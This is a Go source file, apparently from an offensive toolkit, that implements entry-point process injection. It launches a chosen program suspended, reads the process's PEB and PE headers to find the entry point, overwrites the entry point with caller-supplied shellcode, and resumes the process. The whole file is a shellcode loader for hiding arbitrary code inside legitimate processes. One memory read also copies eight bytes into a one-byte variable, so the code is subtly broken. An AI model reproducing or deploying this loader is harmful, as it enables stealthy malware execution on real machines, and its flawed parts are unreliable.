package inject

import (
	"encoding/binary"
	"unsafe"

	"golang.org/x/sys/windows"
)

func NewImageDosHeader(data []byte) *ImageDosHeader {
	imageDosHeader := new(ImageDosHeader)
	imageDosHeader.Parse(data)
	return imageDosHeader
}

func (h *ImageDosHeader) Parse(data []byte) {
	h.E_magic = binary.LittleEndian.Uint16(data[0:2])
	h.E_cblp = binary.LittleEndian.Uint16(data[2:4])
	h.E_cp = binary.LittleEndian.Uint16(data[4:6])
	h.E_crlc = binary.LittleEndian.Uint16(data[6:8])
	h.E_cparhdr = binary.LittleEndian.Uint16(data[8:10])
	h.Eminalloc = binary.LittleEndian.Uint16(data[10:12])
	h.E_maxalloc = binary.LittleEndian.Uint16(data[12:14])
	h.E_ss = binary.LittleEndian.Uint16(data[14:16])
	h.E_sp = binary.LittleEndian.Uint16(data[16:18])
	h.E_csum = binary.LittleEndian.Uint16(data[18:20])
	h.Eip = binary.LittleEndian.Uint16(data[20:22])
	h.E_cs = binary.LittleEndian.Uint16(data[22:24])
	h.E_lfarlc = binary.LittleEndian.Uint16(data[24:26])
	h.E_ovno = binary.LittleEndian.Uint16(data[26:28])
	for i := 0; i < 8; i += 2 {
		h.E_res = append(
			h.E_res,
			binary.LittleEndian.Uint16(data[28+i:30+i]),
		)
	}

	h.E_oemid = binary.LittleEndian.Uint16(data[36:38])
	h.E_oeminfo = binary.LittleEndian.Uint16(data[38:40])
	for i := 0; i < 20; i += 2 {
		h.E_res2 = append(
			h.E_res2,
			binary.LittleEndian.Uint16(data[40+i:42+i]),
		)
	}
	h.E_lfanew = binary.LittleEndian.Uint32(data[60:64])
}

// AddressOfEntryPointInject 进程注入
func AddressOfEntryPointInject(shellcode []byte, path string) {
	// 指定待注入的进程路径
	cmd := windows.StringToUTF16Ptr(path)

	// 初始化启动信息和进程信息结构体
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	// 定义获取进程基本信息所需的参数和变量
	var info int32
	var pbi windows.PROCESS_BASIC_INFORMATION
	var returnLen uint32 = 0
	var SizeOfProcessBasicInformationStruct = unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{})

	// 创建挂起状态的进程
	err := windows.CreateProcess(
		nil,
		cmd,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		return
	}

	// 获取进程的基本信息
	err = windows.NtQueryInformationProcess(
		pi.Process,
		info, unsafe.Pointer(&pbi),
		uint32(SizeOfProcessBasicInformationStruct),
		&returnLen,
	)
	if err != nil {
		return
	}

	// 计算 PEB 地址偏移
	pebOffset := uintptr(unsafe.Pointer(pbi.PebBaseAddress)) + 0x10

	// 读取目标进程的内存数据
	var imageBase byte
	var numberOfBytesRead uintptr
	err = windows.ReadProcessMemory(
		pi.Process,
		pebOffset,
		&imageBase,
		8,
		&numberOfBytesRead,
	)
	if err != nil {
		return
	}

	// 申请内存空间，用于存储 PE 头部信息
	headersBuffer := make([]byte, 4096)

	// 读取目标进程的内存数据，获取 PE 头部信息
	err = windows.ReadProcessMemory(pi.Process, uintptr(imageBase), &headersBuffer[0], 4096, &numberOfBytesRead)
	if err != nil {
		return
	}

	// 解析 DOS 头部信息
	var dosHeader PImageDosHeader
	dosHeader = NewImageDosHeader(headersBuffer)

	// 计算 NT 头部地址
	ntHeaderTmp := uintptr(unsafe.Pointer(&headersBuffer[0])) + uintptr(dosHeader.E_lfanew)
	ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ntHeaderTmp))
	codeEntry := ntHeader.OptionalHeader.AddressOfEntryPoint + uint32(imageBase)

	// 将 Shellcode 写入目标进程内存
	var written uintptr
	err = windows.WriteProcessMemory(pi.Process, uintptr(codeEntry), &shellcode[0], uintptr(len(shellcode)), &written)
	if err != nil {
		return
	}

	// 恢复目标进程执行
	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		return
	}
}
